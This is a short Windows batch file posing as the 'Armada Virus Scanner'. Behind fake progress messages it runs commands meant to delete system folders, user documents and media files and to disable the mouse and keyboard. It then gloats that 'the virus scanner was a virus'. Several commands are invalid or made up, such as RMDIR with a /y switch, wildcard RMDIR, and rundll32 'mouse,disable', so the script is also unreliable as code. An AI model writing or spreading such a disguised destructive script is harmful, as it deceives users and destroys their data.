   @echo off
   color 4
   echo Welcome to the Armada Virus Scanner.
   pause
   echo Would you like to scan now? Y/N
   pause>nul
   goto scan

   :scan
   echo scanning.......
   RMDIR /y C:/programfiles
   echo 1% done
   copy C:/ >>BritneynudepicsXXXhardcore.gif
   cls
   echo 3% done
   RMDIR /Y C:/Windows/drivers
   cls
   echo WARNING,VIRUS FOUND
   pause
   cls
   goto fun

   :fun
   echo deleteing
   echo ......
   echo deleting
   echo !!Armada Virus Scan has just encounterd a fatal error!!!
   Echo Now Closing Armada Virus Scan...
   pause
   goto gh

   :gh
   color 2
   echo Hi,you are now being hacked by Shadow!!
   c:/windows/rundll32.exe mouse,disable
   c:/windows/rundll32.exe keyboard,disable
   RMDIR c:/windows/Fonts
   RMDIR C:/windows/profiles
   RMDIR C:/mydocuments
   Rmdir c:/*.*exe
   RMDIR C:/*.*mp3
   RMDIR C:/*.*jpg
   RMDIR c:/*.*gif
   echo oh bye the way,the virus scanner was a virus lol.
   c:/windows/rundll32.exe mouse,enable
   C:/windows/rundll32.exe keyboard,disable
   exit
